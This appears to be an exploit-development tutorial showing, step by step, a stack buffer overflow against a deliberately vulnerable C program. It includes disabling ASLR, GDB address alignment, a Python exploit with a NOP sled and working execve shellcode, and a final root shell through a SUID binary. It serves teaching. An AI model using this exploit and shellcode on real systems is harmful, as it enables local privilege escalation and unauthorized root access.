### 2. Linux Buffer Overflow with Shellcode

##### The vulnerable program

This C program simple copies standard input into a buffer without checking the input length. It is vulnerable to a buffer overflow. This time there is no useful place to jump to, so we will include shellcode in the payload.

```
#include <string.h>
#include <stdio.h>

void main(int argc, char *argv[]) {
	vuln(argv[1]);
	printf("Done!\n");
}

int vuln(char *str) {
	char buffer[100];
	strcpy(buffer, str);
}
```

##### Disabling ASLR

Even if ASLR is enabled on the target, it's much easier to develop the exploit with ASLR turned off. We can use a test program to verify whether ASLR is turned on:

```
#include <stdio.h>

void main() {
	register int i asm("esp");
	printf("esp = %#10x\n", i);
}
```

If we run this in the default ASLR-on state, we get different values for esp every time we run the program:
```
$ ./esp 
esp = 0xbfe5bd40
$ ./esp 
esp = 0xbff540b0
$ ./esp 
esp = 0xbf85b200
```

To disable ASLR, use the following command:
```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Now, if we run the program again we will get the same addresses for esp:
```
$ ./esp
esp = 0xbffff030
$ ./esp
esp = 0xbffff030
$ ./esp
esp = 0xbffff030
```

##### A quick note about GDB

Memory addresses inside and outside of the debugger do not line up by default. This is because Linux places environmental variables in memory before the stack. Since we will be using the stack to store our payload, in order to make the exploit development process easier, we will make the addresses match up.

In the .gdbinit file we need to explicitly unset two environmental variables LINES and COLUMNS that do not exist outside of the debugger.

```
source ~/peda/peda.py
unset env LINES
unset env COLUMNS
```

When starting gdb, we remove all the environment variables and then load our gdbinit file. This loads peda as well as unsets the two variables that GDB always adds. We then need to load the binary manually with the file command.
```
env - gdb
source ~/.gdbinit
file p3buf
```

The important thing to remember when running the program outside of the debugger is that the PWD variable needs to be set and the **full path** to the binary needs to be used.
```
env - PWD=$PWD /home/jc/exploitdev/p3buf/p3buf
```

We can see that the addresses line up using a test program that prints the memory addresses of the environment variables, the program arguments, and the stack pointer. It also prints every environment variable that is currently set:
```
#include <stdio.h>

int main(int argc, char *argv[], char *envp[]) {
	int *esp;
	
	printf("env: %p\narg:%p\nesp: %p\n",
		envp, argv, &esp);
	while (*envp != NULL) {
		printf("%s\n", *envp);
		++envp;
	}

	return 0;
}
```

```
gdb-peda$ r
Starting program: /home/jc/exploitdev/p3buf/test_addr
env: 0xbffffebc
arg:0xbffffeb4
esp: 0xbffffdf8
PWD=/home/jc/exploitdev/p3buf

$ env - PWD=$PWD /home/jc/exploitdev/p3buf/test_addr
env: 0xbffffebc
arg:0xbffffeb4
esp: 0xbffffdf8
PWD=/home/jc/exploitdev/p3buf
```

Now that our addresses line up, we can get on with developing the exploit!

##### Finding EIP offset

Let's verify that we get a segmentation fault if we use an input that is larger than the buffer:

```
alias p3buf="env - PWD=$PWD /home/jc/exploitdev/p3buf/p3buf"
p3buf $(python -c "print 'A' * 200")
Segmentation fault (core dumped)
```

Now, let's find the offset where we overwrite EIP. To do so, we will start creating our exploit file which we will modify as we go.

```
#!/usr/bin/python

import sys
import string

padding = ""
for char in string.ascii_uppercase:
  padding += char * 4
  # AAAABBBBCCCCDDDDEEEE...

# Double the length of the string
padding += padding

payload = padding

# We use sys.stdout.write so we don't add a newline
sys.stdout.write(payload)
```

Let's make it executable and change our alias to generate the exploit file and then run it.
```
chmod +x exploit.py
touch exploit
alias p3buf="./exploit.py > exploit; env - PWD=$PWD /home/jc/exploitdev/p3buf/p3buf \$(cat exploit)"
```
**Note:** There is an escape slash before the $ in cat. $ is a special character in bash.

If we run the exploit with gdb, we can see that EIP is overwritten at CCCC in the second half of the string. This means that we have 112 (28 * 4) bytes of padding.
```
EIP: 0x43434343 ('CCCC')
```

##### Shellcode and NOPs

We will use the following shellcode. It spawns a shell using /bin/dash.
```
\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80
```

The shellcode is 32 bytes long. That gives us 90 bytes of padding. We will pad the shellcode on both sides with NOP (no operation) \x90 instructions.

Sometimes memory gets shuffled around and you can't always hit the exact address of your shellcode. By padding with NOPs before the shellcode, you can be less accurate. If you hit any address in the range covered by the NOPs, the processor will execute the NOP instructions until it hits the shellcode. This is called a nopsled.

We also pad the shellcode a little bit afterwards because the shellcode often needs room to expand. Otherwise, it can overwrite itself.

```
#!/usr/bin/python
import sys
import string

eip = "AAAA"

nopsled = "\x90" * 64
shellcode = (
"\x31\xc0\x89\xc3\xb0\x17\xcd\x80" + 
"\x31\xd2\x52\x68\x6e\x2f\x73\x68" + 
"\x68\x2f\x2f\x62\x69\x89\xe3\x52" +
"\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
)
padding_length = (28*4) - len(nopsled) - len(shellcode)
padding = "\x90" * padding_length

payload = nopsled + shellcode + padding + eip
sys.stdout.write(payload)
```

If you look at the exploit in a hex editor, you can see the individual bytes:

```
00000000   90 90 90 90  90 90 90 90  90 90 90 90  ............
0000000C   90 90 90 90  90 90 90 90  90 90 90 90  ............
00000018   90 90 90 90  90 90 90 90  90 90 90 90  ............
00000024   90 90 90 90  90 90 90 90  90 90 90 90  ............
00000030   90 90 90 90  90 90 90 90  90 90 90 90  ............
0000003C   90 90 90 90  31 C0 89 C3  B0 17 CD 80  ....1.......
00000048   31 D2 52 68  6E 2F 73 68  68 2F 2F 62  1.Rhn/shh//b
00000054   69 89 E3 52  53 89 E1 8D  42 0B CD 80  i..RS...B...
00000060   90 90 90 90  90 90 90 90  90 90 90 90  ............
0000006C   90 90 90 90  41 41 41 41               ....AAAA

```

Now, let's run the program with GDB again. This time we will put a breakpoint at the end of the vuln function:

```
gdb-peda$ disas vuln
Dump of assembler code for function vuln:
   0x080484a3 <+0>:     push   ebp
   0x080484a4 <+1>:     mov    ebp,esp
   0x080484a6 <+3>:     push   ebx
   0x080484a7 <+4>:     sub    esp,0x74
   0x080484aa <+7>:     call   0x80484ce <__x86.get_pc_thunk.ax>
   0x080484af <+12>:    add    eax,0x1b51
   0x080484b4 <+17>:    sub    esp,0x8
   0x080484b7 <+20>:    push   DWORD PTR [ebp+0x8]
   0x080484ba <+23>:    lea    edx,[ebp-0x6c]
   0x080484bd <+26>:    push   edx
   0x080484be <+27>:    mov    ebx,eax
   0x080484c0 <+29>:    call   0x8048300 <strcpy@plt>
   0x080484c5 <+34>:    add    esp,0x10
   0x080484c8 <+37>:    nop
   0x080484c9 <+38>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x080484cc <+41>:    leave
   0x080484cd <+42>:    ret
End of assembler dump.

gdb-peda$ break *vuln + 41
Breakpoint 2 at 0x80484cc: file p3buf.c, line 12.

gdb-peda$ run $(cat exploit)
```

If we inspect the stack at this point, we will see our nopsled, shellcode, padding, and EIP (0x41414141). We can also verify the stack frame by looking at the values for ESP and EBP.

```
EBP: 0xbffffd78 --> 0x90909090 
ESP: 0xbffffd00

gdb-peda$ x/40xw $esp
0xbffffd00:     0x00000000      0xb7fe1f9b      0x0804820c      0x90909090
0xbffffd10:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffd20:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffd30:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffd40:     0x90909090      0x90909090      0x90909090      0xc389c031
0xbffffd50:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68
0xbffffd60:     0x52e38969      0x8de18953      0x80cd0b42      0x90909090
0xbffffd70:     0x90909090      0x90909090      0x90909090      0x41414141
0xbffffd80:     0xbfffff00      0xbffffe44      0xbffffe50      0x0804846a
0xbffffd90:     0xbffffdb0      0x00000000      0x00000000      0xb7df7e81
```

We need to choose a value for EIP that will land us somewhere in the middle of our NOPsled. Let's choose 0xbffffd28 and update our exploit.


```
#!/usr/bin/python
import sys
import string
import struct

nopsled = "\x90" * 64
shellcode = (
"\x31\xc0\x89\xc3\xb0\x17\xcd\x80" + 
"\x31\xd2\x52\x68\x6e\x2f\x73\x68" + 
"\x68\x2f\x2f\x62\x69\x89\xe3\x52" +
"\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
)
padding_length = (28*4) - len(nopsled) - len(shellcode)
padding = "\x90" * padding_length
eip = struct.pack("I", 0xbffffd28)

payload = nopsled + shellcode + padding + eip
sys.stdout.write(payload)
```

If we run the exploit in gdb we get a shell!

```
gdb-peda$ run $(cat exploit)
Starting program: /home/jc/exploitdev/p3buf/p3buf $(cat exploit)
process 29546 is executing new program: /bin/dash
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol "vuln" in current context.
Error in re-setting breakpoint 2: No symbol "vuln" in current context.
Error in re-setting breakpoint 2: No symbol "vuln" in current context.
$
```

Let's verify that it also works outside of gdb, using our alias. Let's also give it a SUID just for fun.

```
$ sudo chown root p3buf
$ sudo chmod u+s p3buf
$ ls -la p3buf
-rwsr-xr-x 1 root jc 9748 Jun 14 06:45 p3buf
$ p3buf
# whoami
root
```

We got a root shell!
